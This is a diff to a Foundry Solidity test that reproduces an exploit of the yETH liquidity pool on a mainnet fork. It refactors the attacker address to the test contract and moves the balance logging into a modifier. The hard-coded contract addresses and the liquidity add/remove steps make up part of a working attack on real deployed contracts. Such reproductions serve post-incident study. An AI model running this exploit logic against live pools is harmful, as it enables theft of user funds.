@@ -53,31 +53,42 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
     IERC20 constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
     IOETH constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);
 
-    address attacker;
+    address[] internal assetsToLog;
+    modifier balanceLog() override {
+        //Set eth bal to 0
+        vm.deal(address(this), 0);
+        logMultipleTokenBalances(assetsToLog, address(this), "Before exploit");
+        _;
+        logMultipleTokenBalances(assetsToLog, address(this), "After exploit");
+    }
 
     function setUp() public {
         vm.createSelectFork("mainnet", FORK_BLOCK);
         fundingToken = address(0);
-        attacker = address(69);
+        assetsToLog = new address[](NUM_ASSETS + 2);
+
+        // Get all pool assets
+        for (uint256 i = 0; i < NUM_ASSETS; i++) {
+            assetsToLog[i] = POOL.assets(i);
+        }
+
+        // Add YETH and ETH
+        assetsToLog[NUM_ASSETS] = address(YETH);
+        assetsToLog[NUM_ASSETS + 1] = address(0); // ETH
     }
 
     function testExploit() public balanceLog {
-        vm.startPrank(attacker);
-
         _setupInitialBalances();
         _initialRateUpdate();
         _executeExploitSequence();
         //Take back assets from flashloan to get actual profit
         _takeInitialsBack();
-        _logFinalBalances();
-
-        vm.stopPrank();
     }
 
     function _setupInitialBalances() internal {
         for (uint256 i = 0; i < NUM_ASSETS; i++) {
             address asset = POOL.assets(i);
-            deal(asset, attacker, INITIAL_BALANCE);
+            deal(asset, address(this), INITIAL_BALANCE);
             IERC20(asset).approve(address(POOL), type(uint256).max);
         }
         YETH.approve(address(POOL), type(uint256).max);
@@ -86,7 +97,7 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
     function _takeInitialsBack() internal {
         for (uint256 i = 0; i < NUM_ASSETS; i++) {
             address asset = POOL.assets(i);
-            deal(asset, attacker, IERC20(asset).balanceOf(attacker) - INITIAL_BALANCE);
+            deal(asset, address(this), IERC20(asset).balanceOf(address(this)) - INITIAL_BALANCE);
         }
     }
 
@@ -124,8 +135,8 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
 
     function _executePhase1() internal {
         uint256 removeAmount = 416_373_487_230_773_958_294;
-        deal(address(YETH), attacker, removeAmount);
-        console.log("Initial yETH balance:", YETH.balanceOf(attacker));
+        deal(address(YETH), address(this), removeAmount);
+        console.log("Initial yETH balance:", YETH.balanceOf(address(this)));
         _removeLiquidity(removeAmount, "After initial remove");
     }
 
@@ -209,7 +220,7 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
         for (uint256 i = 0; i < NUM_ASSETS; i++) {
             amountsArray[i] = amounts[i];
         }
-        uint256 received = POOL.add_liquidity(amountsArray, 0, attacker);
+        uint256 received = POOL.add_liquidity(amountsArray, 0, address(this));
         console.log("Received yETH:", received);
         _logPoolState(label);
     }
@@ -218,7 +229,7 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
         uint256 amount,
         string memory label
     ) internal {
-        POOL.remove_liquidity(amount, new uint256[](NUM_ASSETS), attacker);
+        POOL.remove_liquidity(amount, new uint256[](NUM_ASSETS), address(this));
         _logPoolState(label);
     }
 
@@ -238,21 +249,6 @@ contract YETHExploitTest is BaseTestWithBalanceLog {
         console.log("=== %s ===", label);
         console.log("  vb_prod:", prod);
         console.log("  vb_sum:", sum);
-    }
-
-    function _logFinalBalances() internal {
-        address[] memory assets = new address[](NUM_ASSETS + 2);
-
-        // Get all pool assets
-        for (uint256 i = 0; i < NUM_ASSETS; i++) {
-            assets[i] = POOL.assets(i);
-        }
-
-        // Add YETH and ETH
-        assets[NUM_ASSETS] = address(YETH);
-        assets[NUM_ASSETS + 1] = address(0); // ETH
-
-        logMultipleTokenBalances(assets, attacker, "Final Balances");
     }
 
     function _getSingleAssetAmounts(
